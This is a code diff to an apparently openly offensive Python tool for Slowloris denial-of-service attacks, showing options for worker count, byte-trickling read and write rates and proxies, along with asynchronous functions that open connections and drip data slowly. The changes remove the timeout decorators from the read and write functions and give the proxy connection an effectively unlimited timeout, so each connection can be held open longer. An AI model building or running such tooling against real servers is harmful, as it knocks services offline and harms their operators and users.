@@ -27,7 +27,7 @@ parser.add_argument('url')
 parser.add_argument('-H', '--header', action='append', default=[], help='add custom header')
 parser.add_argument('--workers', type=int, default=8, help='default: %(default)s')
 parser.add_argument('--interval', type=float, default=1, metavar='SECONDS', help='interval between requests default: %(default)s')
-parser.add_argument('--timeout', type=float, default=15, metavar='SECONDS', help='default: %(default)s')
+parser.add_argument('--timeout', type=float, default=15, metavar='SECONDS', help='connection timeout default: %(default)s')
 parser.add_argument('--read-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second default: %(default)s')
 parser.add_argument('--write-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second default: %(default)s')
 parser.add_argument('-x', '--proxy')
@@ -61,14 +61,12 @@ def slowloris_timeout(timeout):
         return wrapper
     return decorate
 
-@slowloris_timeout(args.timeout)
 async def slowloris_write(writer, data, rate):
     for char in data:
         writer.write(char.encode())
         await writer.drain()
         await asyncio.sleep(rate)
 
-@slowloris_timeout(args.timeout)
 async def slowloris_read(reader, rate, n=-1):
     data = b""
     if n == 0:
@@ -83,7 +81,6 @@ async def slowloris_read(reader, rate, n=-1):
             return data
         await asyncio.sleep(rate)
 
-@slowloris_timeout(args.timeout)
 async def slowloris_readuntil(reader, sep, rate):
     data = b''
     while True:
@@ -105,7 +102,7 @@ async def slowloris_open(host, port, https, proxy):
         return await asyncio.open_connection(host, port, ssl=ssl_ctx)
 
     proxy = Proxy.from_url(proxy)
-    sock = await proxy.connect(dest_host=host, dest_port=port)
+    sock = await proxy.connect(dest_host=host, dest_port=port, timeout=99999999)
     return await asyncio.open_connection(host=None, port=None, sock=sock, ssl=ssl_ctx, server_hostname=host if https else None)
 
 async def slowloris_attack_loop(*args, **kwargs):
